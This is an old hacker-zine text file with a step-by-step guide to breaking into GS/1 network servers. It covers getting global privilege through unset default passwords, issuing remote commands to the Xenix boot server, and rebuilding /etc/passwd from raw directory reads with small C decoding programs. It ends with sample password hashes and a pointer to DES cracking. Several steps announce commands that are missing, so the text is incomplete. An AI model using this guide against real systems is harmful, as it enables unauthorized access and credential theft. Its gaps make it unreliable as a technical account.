              6. Getting the boot server password file
              7. Other avenues


----------------------------------------------------------------------------


Here's hacking a GS/1 made EZ (for the sophisticated hacker)  It is
advisable to fill your stein with Sysco and pay close attention... if
Sysco is not available in your area, Hacker Pschorr beer will work
almost as good... (especially Oktoberfest variety)


What is a GS/1?
---------------
A GS/1 allows a user to connect to various other computers... in other
words, it's a server, like a DEC or Xyplex.


So why hack it?
---------------
Cuz itz there... and plus you kan access all sortz of net stuph fer
phree. (QSD @ 208057040540 is lame and if you connect to it, you're
wasting the GS/1.. the French fone police will fly over to your country
and hunt you down like a wild pack of dogs, then hang you by your own
twisted pair.)


What to do:
-----------



               +--------------------------------------+
               +  #1. Finding and identifying a GS/1  +
               +--------------------------------------+

Find a GS/1 .. they're EZ to identify.. they usually have a prompt of
GS/1, though the prompt can be set to whatever you want it to be.  A
few years ago there were quite a number of GS/1's laying around on
Tymnet and Telenet... you can still find a few if you scan the right
DNIC's.  (If you don't know what the hell I'm talking about, look at
some old Phracks and LOD tech. journals.)

The prompt will look similar to this:

(!2) GS/1>

(The (!2) refers to the port you are on)



                        +--------------------+
                        +  #2. Getting help  +
                        +--------------------+

First try typing a '?' to display help items.

A help listing looks like this:

> (!2) GS/1>?
>       Connect     <address>[,<address>] [ ECM ] [ Q ]
>       DO          <macro-name>
>       Echo        <string>
>       Listen
>       Pause       [<seconds>]
>       PIng        <address> [ timeout ]
>       SET         <param-name> = <value> ...
>       SHow        <argument> ...

At higher privileges such as global (mentioned next) the help will
look like this (note the difference in the GS/1 prompt with a # sign):

> (!2) GS/1# ?
>       BRoadcast   ( <address> ) <string>
>       Connect     ( <address> ) <address>[,<address>] [ ECM ] [ Q ]
>       DEFine      <macro-name> = ( <text> )
>       DisConnect  ( <address> ) [<session number>]
>       DO          ( <address> ) <macro-name>
>       Echo        <string>
>       Listen      ( <address> )
>       Pause       [<seconds>]
>       PIng        <address> [ timeout ]
>       ReaD        ( <address> ) <option> <parameter>
>       REMOTE      <address>
>       ROtary      ( <address> ) !<rotary> [+|-]= !<portid>[-!<portid>] , ...
>       SAve        ( <address> ) <option> <filename>
>       SET         ( <address> ) <param-name> = <value> ...
>       SETDefault  ( <address> ) [<param-name> = <value>] ...
>       SHow        ( <address> ) <argument> ...
>       UNDefine    ( <address> ) <macro-name>
>       UNSave      ( <address> ) <filename>
>       ZeroMacros  ( <address> )
>       ZeroStats   ( <address> )

Additional commands under global privilege are: BRoadcast, DEFine,
DisConnect, ReaD, REMOTE, ROtary, UNDefine, UNSave, ZeroMacros,
ZeroStats, and a few extra options under the normal user commands.

If you need in-depth help for any of the commands, you can again use the
'?' in the following fashion:

> (!2) GS/1>sho ?
>       SHow    ADDRess
>       SHow    ClearingHouseNames [ <name> [ @ <domain> [@ <organ.> ] ] ]
>       SHow    DefaultParameters [<param-name> ...]
>       SHow    GLobalPARameters
>       SHow    NetMAP [ Short | Long ]
>       SHow    PARAmeterS [<param-name> ...]
>       SHow    <param-name> ...
>       SHow    SESsions [ P ]
>       SHow    VERSion

> (!2) GS/1>sh add?
>       SHow    ADDRess

> (!2) GS/1>sh add
> ADDRess = &000023B5%07000201E1D7!2

"sh add" displays your own network, address and port number.

The network is 000023B5
The address is 07000201E1D7
The port number is 2



                   +------------------------------------+
                   +  #3. Gaining top privilege access  +
                   +------------------------------------+

Figure out the global password.

Do a "set priv=global" command.

   Note:
   ----
   There are 3 states to set priv to: user, local, and global.  Global is
   the state with the most privilege.  When you attain global privilege,
   your prompt will change to have a '#' sign at the end of it.. this means
   you have top priceless (similar to *nix's super user prompt).

The GS/1 will prompt you for a password.  The default password on GS/1's
is to have no password at all... The GS/1  will still prompt you for a
password, but you can enter anything at this point if the password was
never set.



                  +-------------------------------+
                  +  #4. Finding the boot server  +
                  +-------------------------------+

Figure out the boot server address available from this GS/1 ..

The boot server is what lies under the GS/1.  We've found that GS/1's are
actually run on a Xenix operating system.. (which is of course a nice
phamiliar territory)  It's debatable whether all GS/1's are run on Xenix or
not as we have yet to contact the company.  (We may put out a 2nd file going
into more detail.)

Do a "sh b" or "sh global" as shown in the following examples:

> (!2) GS/1# sh b
> BAud = 9600         BootServerAddress = &00000000%070002017781
> BReakAction = ( FlushVC, InBand )       BReakChar = Disabled
> BSDelay = None      BUffersize = 82

> (!2) GS/1# sh global
> ...............................Global Parameters............................
> DATE = Wed Jun 22 21:16:45 1994         TimeZone = 480 minutes
> DaylightSavingsTime = 0 minutes         LogoffStr = "L8r laM3r"
> WelcomeString = "Welcome to your haqued server (!2), Connected to "
> DOmain = "thelabz"                      Organization = "delam0"
> PROmpt = "GS/1>"                        NMPrompt = "GS/1# "
> LocalPassWord = ""                      GlobalPassWord = "haque-me"
> NetMapBroadcast = ON                    MacType = EtherNET
> CONNectAudit = ON                       ERRorAudit = ON
> AUditServerAddress = &000031A4%07000200A3D4
> AUditTrailType = Local
> BootServerAddress = &00000000%070002017781

Side note: the GlobalPassWord is "haque-me" whereas the LocalPassWord is ""
... these are the actual passwords that need to be entered (or in the case
of the LocalPassWord, "" matches any string).  You'll only be able to
"sh global" after a successful "set priv=global".

Now that you have the boot server address, the next step is enabling
communication to the boot server.



              +-------------------------------------+
              +  #5. Connecting to the boot server  +
              +-------------------------------------+

Do a REMOTE <address> where address is the address of the machine you
want to issue remote commands to.

> (!2) GS/1# REMOTE %070002017781
> (!2) Remote: ?
>       BInd        <address> [-f <bootfile>] [-l <loader>] [<nports>]
>       BRoadcast   ( <address> ) "<string>"
>       CoPyfile    [<address>:]<pathname> [<address>:][<pathname>]
>       LiSt        [ -ls1CR ] [<pathname> ...]
>       MoVe        <pathname> <pathname>
>       NAme        <clearinghouse name> = <address>[,<address>]...
>       Ping        <address> [timeout]
>       ReMove      <pathname> ...
>       SET         [( <address> )] <param-name> = <value> ...
>       SETDefault  <param-name> = <value> ...
>       SHow        <argument>
>       UNBind      <address>
>       UNDefine    <macro name>
>       UNName      <name>
>       ZeroStats
>       <BREAK>     (to leave remote mode)

Your prompt changes from "(!2) GS/1# " to "(!2) Remote: "... this means
you will be issuing commands to whatever remote machine you specified
by the REMOTE <address> command.

Notice for this case, the boot server's address was used.

When you get the REMOTE: prompt, you can issue commands that will be
executed on the remote machine.  Try doing a '?' to see if it's another
GS/1.. if not, try doing 'ls' to see if you have a *nix type machine.

Also notice that the help commands on the remote are not the same as
those for the GS/1 (though, if you establish a remote link with another
GS/1 they will be the same).

Look familiar??  If not, go to the nearest convenient store and buy the
a 12 pack of the cheapest beer you can find.. leave your computer
connected so you hurry back, and slam eight or nine cold onez... then
look at the screen again.

You're basically doing a Remote Procedure Call for ls to your Xenix boot
server.

Notice at this point that the "passwd" is not owned by root.  This is
because this is not the system password file, and you are not in the
"/etc" directory... (yet)

There are a couple of problems:

> (!2) Remote: cat
> Invalid REMOTE command
>
> (!2) Remote: cd /etc
> Invalid REMOTE command

You cannot view files and you cannot change directories.

To solve the "cd" problem do the following:

Your brain should now experience deja vous.. you just found the
root directory.  (for the non-*nix, lam0-hacker, the root directory
has key *nix directories such as /etc, /bin, /dev, /lib, etc. in it.)

Now you can get to /etc/passwd as follows:

Yeah, now what?!

You've found the /etc/passwd file, but you don't have "cat" to type the
file out.  Now you're stuck... so drink a half a bottle of Sysco per
person. (We did... and as you'll see, Sysco is the drink of a manly hackers
like us... make sure it's the big bottle kind not those girly small
onez.)



            +---------------------------------------------+
            +  #6. Getting the boot server password file  +
            +---------------------------------------------+

There is one way to get around the cat problem (no itz n0t puttin
catnip laced with somethin U made frum a phile on yer doorstep)
It's done using ls.  On this Xenix system, the directory structure is
the old Unix format: A 16 byte record comprised of a 2 byte I-number
and a 14 byte character field.

   Note about directory structure for the inquisitive hacker:
   In a directory record there is a 14 byte string containing the file
   name, and the 2 byte I-number (2 bytes = an integer in this case)
   which is a number that is an (I)ndex pointer to the I-node.  The
   I-node then contains the information about where the file's data is
   actually kept (similar to how a FAT table works on an IBM PC yet a
   different concept as it has indirect index blocks etc. I won't get
   into) and what permissions are set for the file.  Be warned that in
   newer *nix implementations, file names can be more than 14 characters
   and the directory structure will be a bit different than discussed.

The "ls" command has an option that allows you to tell it "this *file* is
a *directory*.. so show me what's in the directory"... newer *nix
systems won't like this (the -f option) because of the new directory
structure.

Wow, kewl.  Now that you have a bunch-o-shit on your screen, you have
to make some sense out of it.

The password file is almost legible, but the I-numbers still need to be
converted to ASCII characters.  This can be accomplished in a variety of
ways... the easiest is to write a program like the following in C:

On a PC the following code should work:

#include <stdio.h>
main()
{
   union {
      int i;
      char c[2];
   } x;
   while (1) {
      printf("Enter I-Number: ");
      scanf("%d", &x.i);
      printf("%d = [%c][%c]\n\n", x.i, x.c[0], x.c[1]);
   }
}

On a *nix based system the following code will work (depending on
word size and byte arrangement):

#include <stdio.h>
main()
{
   union {
      short int i;
      char c[2];
   } x;
   while (1) {
      printf("Enter I-Number: ");
      scanf("%hd", &x.i);
      printf("%d = [%c][%c]\n\n", x.i, x.c[1], x.c[0]);
   }
}


When you have translated the I-numbers you can substitute the ASCII
values by hand (or write a d0p3 program to do it for you):

Because the ls command cannot display "non-printable" characters such
as the carriage return, it will replace them with a '?' character...
delete the '?' characters and divide by line at these locations.  When
you finish doing that, you'll have a standard /etc/passwd file:

root:BJlx/e8APHetw:0:0:Super user:/:/bin/csh
sysadm:X/haSqFDwHz1Q:0:0:System Administration:/usr/sysadm:/bin/sh

dos:NOLOGIN:16:10:Access to Dos devices:/:
ncs:yYNFmHnL7WxcU:100:100:NCS operator:/usr

Once you've assembled your password file in a standard ASCII form,
you'll of course want to crack it with one of the many available DES
cracking programs.

The boot server address, from previous examples, is number 1
which contains a description "SW/AT-NCS".  Examining the rest of the
list, number 6 has the same description.  System 12 may be just another
address for the boot server or it may be a different Xenix... but it should
be Xenix whatever it is.

We have refrained from covering the typical GS/1 information that has been
published by others; and instead, covered newer concepts in GS/1 hacking.
This phile is not a complete guide to GS/1 hacking; but expect successive
publications on the topic.
